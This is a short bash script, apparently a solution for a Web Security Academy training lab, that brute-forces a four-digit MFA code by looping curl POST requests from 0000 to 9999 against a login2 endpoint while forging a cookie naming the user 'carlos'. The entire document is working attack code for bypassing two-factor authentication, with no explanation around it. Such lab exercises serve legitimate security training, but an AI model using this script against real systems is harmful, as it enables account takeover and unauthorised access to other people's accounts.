#!/bin/bash

ENDPOINT="https://0a7c003603c017278005e46b00bf0062.web-security-academy.net/login2"
COOKIE="session=123;verify=carlos"


for idx in {0..9999}
do
	MFA=$(printf "mfa-code=%04d\n" $idx)
curl $ENDPOINT -o /dev/null -s \
-w "Http Code: %{http_code} Used MFA: $MFA \n" \
-b "$COOKIE" \
--data-binary $MFA \

done
